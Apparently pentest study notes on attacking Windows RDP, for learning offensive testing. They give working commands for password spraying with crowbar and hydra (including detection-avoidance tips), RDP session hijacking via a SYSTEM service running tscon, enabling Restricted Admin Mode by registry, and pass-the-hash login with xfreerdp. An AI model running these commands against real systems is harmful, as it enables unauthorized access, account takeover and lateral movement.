# Attacking RDP

Remote Desktop Protocol (RDP) is a proprietary protocol developed by Microsoft that provides users with a graphical interface to connect to another computer over a network connection. It is one of the most widely used administration tools in Windows environments because it allows administrators to remotely manage systems as if they were physically present.

Managed Service Providers (MSPs) also heavily rely on RDP to manage hundreds of customer systems remotely. While RDP greatly improves remote administration, it also creates a major attack surface for attackers and penetration testers.

By default, RDP uses:
- TCP Port 3389
- Sometimes UDP Port 3389

---

# Enumerating the RDP Service

Before attacking RDP, first confirm:
- The port is open
- RDP is actually running
- The host is reachable

We can use Nmap for enumeration.

```bash
nmap -Pn -p3389 192.168.2.143
```

### Example Output

```text
PORT     STATE SERVICE
3389/tcp open  ms-wbt-server
```

This confirms:
- Port 3389 is open
- Microsoft RDP service is running

---

# Misconfigurations

Because RDP depends on username/password authentication, one of the most common attack vectors is:
```text
Password Guessing
```

In some rare situations:
- RDP may have weak passwords
- Default credentials
- Or even no password at all due to misconfiguration

---

# Important Consideration — Account Lockout Policies

Windows systems usually implement:
```text
Account Lockout Policies
```

Too many failed login attempts may:
- Lock user accounts
- Trigger security alerts
- Notify administrators

Because of this, traditional brute-forcing becomes risky.

---

# Password Spraying

To avoid lockouts, attackers often use:
```text
Password Spraying
```

Instead of:
```text
Trying many passwords against one user
```

we:
```text
Try one password against many users
```

This helps remain below lockout thresholds.

---

# Username List Example

```text
root
test
user
guest
admin
administrator
```

---

# Password Spraying with Crowbar

Crowbar is commonly used for RDP password spraying.

```bash
crowbar -b rdp -s 192.168.220.142/32 -U users.txt -c 'password123'
```

### Command Explanation

| Option | Purpose |
|---|---|
| `-b rdp` | Use RDP module |
| `-s` | Target IP/Subnet |
| `-U` | Username list |
| `-c` | Password being sprayed |

---

# Example Result

```text
RDP-SUCCESS : 192.168.220.142:3389 - administrator:password123
```

Valid credentials discovered:
```text
administrator : password123
```

---

# Password Spraying with Hydra

Hydra can also be used against RDP.

```bash
hydra -L usernames.txt -p 'password123' 192.168.2.143 rdp
```

### Command Explanation

| Option | Purpose |
|---|---|
| `-L` | Username list |
| `-p` | Single password |
| `rdp` | Target protocol |

---

# Important Hydra Warning

RDP services do not handle large parallel connections well.

Hydra warns:

```text
rdp servers often don't like many connections
```

Recommended options:
- `-t 1`
- `-t 4`
- `-W 1`
- `-W 3`

This:
- Reduces instability
- Prevents dropped connections
- Helps avoid detection

---

# Establishing an RDP Session

Once credentials are obtained, connect using:
- `rdesktop`
- `xfreerdp`

Example:

```bash
rdesktop -u admin -p password123 192.168.2.143
```

---

# Invalid Certificate Warning

During connection, RDP may display:
```text
Invalid or self-signed certificate warnings
```

This is common in internal environments.

Example:

```text
Certificate issuer is not trusted
```

Penetration testers usually continue after verifying the host.

---

# Protocol Specific Attacks

After compromising a machine and gaining:
```text
Local Administrator privileges
```

we may abuse RDP further for:
- Session hijacking
- Privilege escalation
- Lateral movement

---

# RDP Session Hijacking

If another user is already connected via RDP:
- We may hijack their session
- Impersonate their account
- Gain their privileges

This is especially dangerous in:
- Active Directory environments
- Admin workstations
- Jump servers

Potential targets:
- Domain Admins
- Help Desk operators
- IT administrators

---

# Scenario Example

Assume:
- We are logged in as `juurena`
- Another user `lewen` is also connected

Goal:
```text
Hijack lewen's RDP session
```

---

# Requirement — SYSTEM Privileges

To hijack another session:
```text
Local Admin alone is NOT enough
```

We need:
```text
NT AUTHORITY\SYSTEM
```

because session switching requires elevated privileges.

---

# Enumerating Logged-In Users

Use:

```cmd
query user
```

### Example Output

```text
USERNAME              SESSIONNAME        ID
juurena               rdp-tcp#13          1
lewen                 rdp-tcp#14          2
```

Important details:
- `lewen` session ID = 2
- Our session = `rdp-tcp#13`

---

# Using tscon.exe

Microsoft provides:
```text
tscon.exe
```

which allows connecting to another terminal session.

Syntax:

```cmd
tscon #{TARGET_SESSION_ID} /dest:#{OUR_SESSION_NAME}
```

---

# Creating a SYSTEM Service

A simple method to gain SYSTEM execution is:
```text
Creating a Windows service
```

Services run as:
```text
Local System
```

Use:

```cmd
sc.exe create sessionhijack binpath= "cmd.exe /k tscon 2 /dest:rdp-tcp#13"
```

### Explanation

| Component | Purpose |
|---|---|
| `tscon 2` | Target session ID |
| `/dest:rdp-tcp#13` | Redirect target session into our RDP window |

---

# Starting the Service

```cmd
net start sessionhijack
```

---

# Result

Once started:
- Our RDP window refreshes
- We inherit the target user's desktop session
- No password required

This effectively impersonates the victim user.

---

# Important Note

```text
This technique no longer works on Windows Server 2019+
```

due to enhanced session isolation protections.

---

# RDP Pass-the-Hash (PtH)

Sometimes we only obtain:
- NTLM hashes
- SAM database hashes
- NTDS.dit hashes

without recovering the cleartext password.

In certain cases, we can still authenticate using:
```text
Pass-the-Hash (PtH)
```

---

# Goal of RDP PtH

Authenticate to RDP:
```text
Using only the NTLM hash
```

without knowing the actual password.

---

# Important Caveat

By default:
```text
RDP does NOT allow hash authentication
```

The target system must have:
```text
Restricted Admin Mode enabled
```

---

# Common Error

If disabled, we receive:

```text
Account restrictions prevent sign-in due to blank passwords, limited sign-in times, or policy restrictions.
```

---

# Enabling Restricted Admin Mode

Add the following registry key:

```cmd
reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
```

This creates:
```text
DisableRestrictedAdmin = 0
```

which enables Restricted Admin Mode.

---

# Executing Pass-the-Hash with xfreerdp

```bash
xfreerdp /v:192.168.220.152 /u:lewen /pth:300FF5E89EF33F83A8146C10F5AB9BB9
```

### Explanation

| Option | Purpose |
|---|---|
| `/v:` | Target IP |
| `/u:` | Username |
| `/pth:` | NTLM hash |

---

# Successful PtH Result

If successful:
- We gain full RDP GUI access
- No password is needed
- We authenticate directly with the NTLM hash

---

# Important Takeaways

- RDP is one of the most important Windows attack surfaces.
- Password spraying is safer than brute-force attacks.
- Hydra requires reduced thread counts for RDP stability.
- Session hijacking can lead to privilege escalation.
- SYSTEM privileges are required for tscon hijacking.
- Pass-the-Hash allows GUI access without cracking passwords.
- Restricted Admin Mode must be enabled for RDP PtH attacks.
- RDP attacks are extremely common in internal penetration tests and Active Directory environments.
